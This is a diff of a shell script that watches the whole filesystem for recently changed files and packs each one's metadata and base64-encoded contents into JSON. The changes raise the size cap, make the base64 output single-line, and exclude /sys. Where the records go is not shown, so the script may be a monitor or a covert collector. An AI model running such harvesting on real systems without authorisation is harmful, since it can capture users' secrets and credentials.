@@ -5,7 +5,7 @@ lt=$(date +%s)
 
 track_file() {
   path=$1
-  max=4096
+  max=32768
 
   if [ -f $path ]; then
     size=$(wc -c <"$path")
@@ -26,7 +26,7 @@ track_file() {
     fi
 
     if [ $size -le $max ]; then
-      body=$(base64 $path)
+      body=$(base64 $path -w0)
     fi
 
     data="{\"path\":\"$path\", \"hash\":\"$hash\", \"perm\":\"$perm\", \"attr\":\"$attr\", \"size\":\"$size\", \"body\":\"$body\"}"
@@ -40,7 +40,7 @@ while true; do
   ct=$(date +%s)
   dt=$((ct - lt + di))
   ds="$dt seconds ago"
-  find / -type f -newermt "$ds" -not -path "/proc/*" -exec bash -c 'track_file "$@"' bash {} \; > /dev/null 2>&1
+  find / -type f -newermt "$ds" -not -path "/proc/*" -not -path "/sys/*" -exec bash -c 'track_file "$@"' bash {} \; > /dev/null 2>&1
   lt=$ct
   di=$(($RANDOM % 7 + 3))
   sleep $di
